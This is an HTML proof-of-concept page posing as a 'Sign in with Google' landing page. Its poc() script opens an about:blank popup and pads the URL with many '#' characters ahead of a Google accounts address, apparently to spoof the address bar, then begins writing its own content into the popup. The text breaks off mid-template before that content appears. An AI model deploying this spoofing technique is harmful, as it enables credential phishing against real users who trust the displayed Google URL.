<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google Login</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f5f5f7;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
    }
    .landing {
      text-align: center;
      padding: 40px;
      background: white;
      border-radius: 16px;
      box-shadow: 0 8px 30px rgba(0,0,0,0.15);
    }
    .landing h1 {
      font-size: 28px;
      margin-bottom: 30px;
      color: #202124;
    }
    button {
      background-color: #4285f4;
      color: white;
      border: none;
      padding: 16px 40px;
      font-size: 18px;
      border-radius: 50px;
      cursor: pointer;
      box-shadow: 0 6px 20px rgba(66,133,244,0.4);
      transition: 0.3s;
    }
    button:hover {
      background-color: #3367d6;
      transform: translateY(-2px);
    }
  </style>
</head>
<body>

  <div class="landing">
    <h1>Sign in with Google</h1>
    <button onclick="poc()">Login with Google</button>
  </div>

  <script>
    function poc() {
      const v = window.open('about:blank#xss', 'popup', 'width=500,height=600,popup');
      v.location.href = 'about:blank######################################################################################https://accounts.google.com/login';
      setTimeout(() => {
        v.document.body.innerHTML = `
